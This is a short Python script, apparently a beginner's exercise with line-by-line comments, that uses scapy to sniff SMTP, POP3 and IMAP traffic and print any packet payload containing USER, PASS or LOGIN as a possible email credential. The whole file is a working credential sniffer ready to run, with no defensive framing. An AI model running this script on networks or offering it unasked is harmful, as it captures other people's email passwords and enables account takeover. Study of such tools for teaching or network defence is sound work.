from scapy.all import sniff  # Importing 'sniff' function from scapy

def packet_callback(packet):  # You define a function called packet_callback
    if packet.haslayer('Raw'):  # This checks if the packet has a Raw layer
        payload = packet['Raw'].load  # Gets the actual data from the Raw layer
        try:
            if b"USER" in payload or b"PASS" in payload or b"LOGIN" in payload:
                print("[+] Possible Email Credential:")
                print(payload.decode(errors="ignore"))
        except:
            pass  # Ignore any error and move on

def main():
    sniff(filter="tcp port 25 or tcp port 110 or tcp port 143", prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
